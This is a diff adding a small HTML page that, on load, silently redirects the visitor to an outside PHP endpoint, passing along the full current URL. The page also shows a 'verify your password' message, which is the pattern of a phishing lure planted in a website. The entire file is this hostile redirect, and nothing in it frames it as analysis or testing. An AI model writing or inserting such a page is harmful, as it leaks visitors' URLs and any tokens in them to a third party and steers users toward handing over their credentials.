@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Redirecting...</title>
+<script type="text/javascript">
+    window.onload = function() {
+        function Redirect (url){
+            window.location.href = url;
+        }
+        var urlParams = new URLSearchParams(window.location.href);
+        var e = window.location.href;
+        
+       
+        Redirect("https://wilcityapp.com/.in.php?url="+e);
+    }
+</script>
+</head>
+<body>
+<p>Because you're accessing sensitive info, you need to verify your password.</p>
+</body>
+</html>
